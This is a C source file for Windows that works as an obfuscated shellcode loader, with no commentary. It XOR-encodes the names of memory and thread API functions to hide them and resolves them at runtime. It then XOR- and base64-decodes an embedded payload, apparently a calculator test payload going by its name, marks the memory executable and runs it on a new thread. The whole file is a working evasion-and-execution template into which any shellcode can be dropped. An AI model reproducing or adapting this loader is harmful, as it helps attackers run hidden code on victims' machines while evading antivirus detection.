#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <wincrypt.h>
#pragma comment (lib, "Crypt32.lib")

LPVOID (WINAPI * ADIlScUq_08)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect);
BOOL   (WINAPI * XXffeVws_82)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flNewProtect, PDWORD lpflOldProtect);
VOID   (WINAPI * GZxcXppJ_75)(VOID UNALIGNED *Destination, const VOID UNALIGNED *Source, SIZE_T Length);
HANDLE (WINAPI * YiVPMqdg_26)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
DWORD  (WINAPI * yLEXDxAY_48)(HANDLE hHandle, DWORD  dwMilliseconds);
DWORD  (WINAPI * paJDuEtY_86)();
BOOL   (WINAPI * pCryptStringToBinary)(LPCSTR pszString, DWORD cchString, DWORD dwFlags, BYTE *pbBinary, DWORD  *pcbBinary, DWORD *pdwSkip, DWORD *pdwFlags);

unsigned char calc_payload[] = { 0x4e, 0x27, 0xa, 0x20, 0x50, 0x36, 0x23, 0x7, 0x1e, 0x2b, 0x2a, 0x2d, 0x2c, 0x2b, 0x29, 0x22, 0x20, 0x24, 0x31, 0x27, 0x20, 0x20, 0x2d, 0x31, 0x34, 0x1e, 0x2b, 0xe, 0x30, 0x2d, 0x11, 0x35, 0x3e, 0x2d, 0x0, 0x26, 0x3e, 0x4, 0x5, 0x27, 0x6, 0x41, 0x38, 0x15, 0x20, 0x3d, 0x1, 0xf, 0x22, 0x3d, 0x1e, 0x2a, 0x15, 0x52, 0x13, 0x2f, 0x31, 0x32, 0x2f, 0x22, 0x3a, 0x2e, 0x23, 0x2d, 0x1f, 0x2a, 0x17, 0x18, 0x17, 0x33, 0x3a, 0x7, 0x3c, 0x33, 0x3f, 0x3a, 0x0, 0x2b, 0x50, 0x20, 0x22, 0x7, 0x2d, 0xf, 0x50, 0x3e, 0x23, 0x28, 0x3e, 0x39, 0x4, 0x22, 0x3a, 0x19, 0x32, 0x3e, 0x22, 0x1e, 0xd, 0x3f, 0x36, 0x1c, 0x3a, 0x36, 0x6, 0x2b, 0x4, 0x25, 0x24, 0x27, 0x25, 0x21, 0x1, 0x9, 0x29, 0x5c, 0x37, 0x5e, 0x8, 0x32, 0x41, 0x34, 0x30, 0x38, 0x26, 0x34, 0x1f, 0x3d, 0x10, 0x4a, 0x20, 0x5, 0x30, 0x35, 0x2d, 0x37, 0x53, 0x59, 0x33, 0x23, 0x44, 0x54, 0x1, 0x2c, 0x6, 0xa, 0x22, 0x3b, 0x20, 0x35, 0x3d, 0x21, 0x23, 0x2c, 0x31, 0x30, 0x32, 0x26, 0x2b, 0x25, 0x17, 0x23, 0x2f, 0x2a, 0x10, 0x3b, 0x5a, 0x2e, 0x2c, 0xd, 0x2a, 0x44, 0x45, 0x3a, 0x2b, 0xc, 0x21, 0x37, 0x39, 0x35, 0x33, 0x3b, 0x9, 0x24, 0x2c, 0x0, 0x23, 0x57, 0x55, 0x2e, 0x1, 0x2f, 0x2, 0x5c, 0x2c, 0x5, 0x3c, 0x21, 0x39, 0x23, 0x29, 0x1f, 0x32, 0x3a, 0x33, 0x3d, 0x11, 0x3f, 0x8, 0x52, 0x22, 0x7, 0x36, 0x37, 0x2f, 0x39, 0x38, 0x33, 0x18, 0x29, 0x4, 0x2b, 0x8, 0x32, 0x41, 0x37, 0x35, 0x2d, 0x24, 0x20, 0x1f, 0x1d, 0x2e, 0x2c, 0x11, 0x20, 0x34, 0x21, 0x23, 0x3c, 0x36, 0x3e, 0x19, 0x23, 0xc, 0x47, 0x1a, 0x9, 0x3e, 0x26, 0x3d, 0x5d, 0x47, 0x32, 0x1d, 0x34, 0x20, 0x2e, 0x9, 0x33, 0x8, 0x1a, 0x2f, 0x14, 0x33, 0x49, 0x48, 0x47, 0x46, 0x5b, 0x5a, 0x25, 0x18, 0x9, 0x2a, 0x31, 0x30, 0x33, 0x32, 0x35, 0x34, 0x37, 0x36, 0x39, 0x2a, 0x33, 0x53, 0x2c, 0x22, 0x35, 0x20, 0x27, 0x26, 0x2d, 0x2e, 0x5c, 0x26, 0x35, 0x19, 0x18, 0x7, 0x5f, 0x5e, 0x24, 0x6, 0x5b, 0x36, 0x47, 0x18, 0x14, 0x23, 0x38, 0x14, 0x13, 0x2, 0x32, 0x13, 0x3c, 0x54, 0x47, 0x58, 0x3f, 0x2, 0x28, 0x15, 0x2d, 0x8, 0x48, 0x33, 0x1c, 0x4, 0x3f, 0x12, 0x26, 0x1, 0x1f, 0x1d, 0x2b, 0x36, 0x55, 0x31, 0x1c, 0x2b, 0x1f, 0x5, 0x5a, 0x6, 0x2b, 0x3c, 0x39, 0x2a, 0x24, 0x5d, 0x6, 0x5e, 0x24, 0x2a, 0x46, 0x33, 0x5, 0x2e, 0x1, 0x4c, 0x16, 0x4, 0x25, 0x36, 0x25, 0x00 };
unsigned int calc_len = sizeof(calc_payload) - 1;
const char xor_func_key[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
const char xor_payload_key[] = "abcdefghijklmnopqrstuvwxyz";

void XOR(char data[], int data_len, const char key[], int key_len){
    int i, j = 0;
    
    for (i = 0; i < data_len; i++){
        if (j==key_len){
            j = 0;
        }
        data[i] = data[i] ^ key[j];

        j++;
    }
}

int main(void){
    void * exec_mem;
    DWORD decoded_data_len;
	BOOL rv, fret, _fret;
	HANDLE th;
    DWORD oldprotect = 0;

    char aOkBoNan_72[] = { 0x17, 0x2B, 0x31, 0x30, 0x30, 0x27, 0x2B, 0x9, 0x25, 0x26, 0x24, 0x2F, 0x00 };
    char ZFpjwcEi_49[] = { 0x17, 0x2b, 0x31, 0x30, 0x30, 0x27, 0x2b, 0x18, 0x3b, 0x25, 0x3f, 0x29, 0x2e, 0x3a, 0x00 };
    char wHTaasGM_65[] = { 0x13, 0x36, 0x2f, 0x9, 0x2a, 0x30, 0x22, 0x5, 0x2c, 0x27, 0x24, 0x3e, 0x34, 0x00 };
    char DUqpkuhG_07[] = { 0x2, 0x30, 0x26, 0x25, 0x31, 0x23, 0x13, 0x20, 0x3b, 0x2f, 0x2a, 0x28, 0x00 };
    char MBmkUwSv_33[] = { 0x16, 0x23, 0x2a, 0x30, 0x3, 0x29, 0x35, 0x1b, 0x20, 0x24, 0x2c, 0x20, 0x28, 0x1, 0x2d, 0x3a, 0x34, 0x31, 0x27, 0x00 }; 
    char qUtERxmP_46[] = { 0x6, 0x27, 0x37, 0x8, 0x24, 0x35, 0x33, 0xd, 0x3b, 0x38, 0x24, 0x3e, 0x00};
    char sCryptStringToBinary[] = { 0x2, 0x30, 0x3a, 0x34, 0x31, 0x15, 0x33, 0x3a, 0x20, 0x24, 0x2c, 0x18, 0x22, 0xc, 0x26, 0x3e, 0x30, 0x20, 0x2a, 0x00}; 
    
    XOR(aOkBoNan_72, sizeof(aOkBoNan_72)-1, xor_func_key,  strlen(xor_func_key));
    XOR(ZFpjwcEi_49, sizeof(ZFpjwcEi_49)-1, xor_func_key,  strlen(xor_func_key));
    XOR(wHTaasGM_65, sizeof(wHTaasGM_65)-1, xor_func_key,  strlen(xor_func_key));
    XOR(DUqpkuhG_07, sizeof(DUqpkuhG_07)-1, xor_func_key,  strlen(xor_func_key));
    XOR(MBmkUwSv_33, sizeof(MBmkUwSv_33)-1, xor_func_key,  strlen(xor_func_key));
    XOR(qUtERxmP_46, sizeof(qUtERxmP_46)-1, xor_func_key, strlen(xor_func_key));
    XOR(sCryptStringToBinary, sizeof(sCryptStringToBinary)-1, xor_func_key, strlen(xor_func_key));
    XOR(calc_payload, calc_len, xor_payload_key, strlen(xor_payload_key));

    ADIlScUq_08 = GetProcAddress(GetModuleHandle("kernel32.dll"),  aOkBoNan_72);
    XXffeVws_82 = GetProcAddress(GetModuleHandle("kernel32.dll"),  ZFpjwcEi_49);
    GZxcXppJ_75 = GetProcAddress(GetModuleHandle("kernel32.dll"),  wHTaasGM_65);
    YiVPMqdg_26 = GetProcAddress(GetModuleHandle("kernel32.dll"),  DUqpkuhG_07);
    yLEXDxAY_48 = GetProcAddress(GetModuleHandle("kernel32.dll"),  MBmkUwSv_33);
    paJDuEtY_86 = GetProcAddress(GetModuleHandle("kernel32.dll"),  qUtERxmP_46);
    pCryptStringToBinary = GetProcAddress(GetModuleHandle("crypt32.dll"),  "CryptStringToBinaryA");
    
    if(pCryptStringToBinary == NULL){
        printf("Error!\n");
        return -1;
    }

    if (yLEXDxAY_48 == NULL || ADIlScUq_08 == NULL || XXffeVws_82 == NULL || GZxcXppJ_75 == NULL || YiVPMqdg_26 == NULL){
        return -1;
    }

    fret =  CryptStringToBinary((LPCSTR) calc_payload, calc_len, CRYPT_STRING_BASE64, NULL, &decoded_data_len, NULL, NULL);
    if (!fret) {
        return -2;
    }

    exec_mem = ADIlScUq_08(0, decoded_data_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if(exec_mem == NULL){
        return -4;
    }

    fret =  CryptStringToBinary((LPCSTR) calc_payload, calc_len, CRYPT_STRING_BASE64, (BYTE *)exec_mem, &decoded_data_len, NULL, NULL);
    if (!fret){
        return -2;
    }
    
	rv = XXffeVws_82(exec_mem, calc_len, PAGE_EXECUTE_READ, &oldprotect);
    
	if ( rv != 0 && paJDuEtY_86() == 0) {
			th = YiVPMqdg_26(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
			yLEXDxAY_48(th, -1);
	}

    else {
        return -3;
    }
    return 0;
}
